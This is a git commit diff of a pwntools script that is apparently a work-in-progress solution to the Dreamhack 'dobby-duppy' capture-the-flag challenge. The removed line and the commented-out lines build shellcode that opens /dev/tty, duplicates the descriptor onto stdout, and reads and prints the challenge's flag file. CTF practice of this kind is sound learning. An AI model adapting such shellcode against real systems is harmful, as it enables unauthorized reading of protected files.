b9d92fbb7c848960e00f3629578ef39ed238aaa2
Brian Lee <hibrian827@gmail.com>
2025-01-31 00:17:18 +0900

    solving dobby-duppy

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -3,9 +3,17 @@ from pwn import *
 context.arch = "amd64"
 
 rem = process("./Pwnable/dobby-duppy/problem/chall")
+# gdb.attach(rem)
 
-payload = asm(shellcraft.open("/dev/tty", flags=os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode=0o644) + shellcraft.dup2('rax', 1) + shellcraft.open("./Pwnable/dobby-duppy/problem/flag", 0) + shellcraft.write(1, "rax", 0x100))
+payload = asm(shellcraft.open("/dev/tty"))
+# payload += asm(shellcraft.dup2('rax', 1) )
+# payload += asm(shellcraft.open("./Pwnable/dobby-duppy/problem/flag", 0))
+# payload += asm("mov rdi, rax")
+# payload += asm("mov rsi, rsp")
+# payload += asm("sub rsi, 0x30")
+# payload += asm(shellcraft.read("rdi", "rsi", 0x30))
+# payload += asm(shellcraft.write(1, "rsi", 0x30))
 # print(len(payload))
-rem.sendlineafter(b":) ", payload)
+rem.sendlineafter(b":) ", b"")
 rem.recvuntil(b"bliiiiiiiiind\n")
 print(rem.recvall())
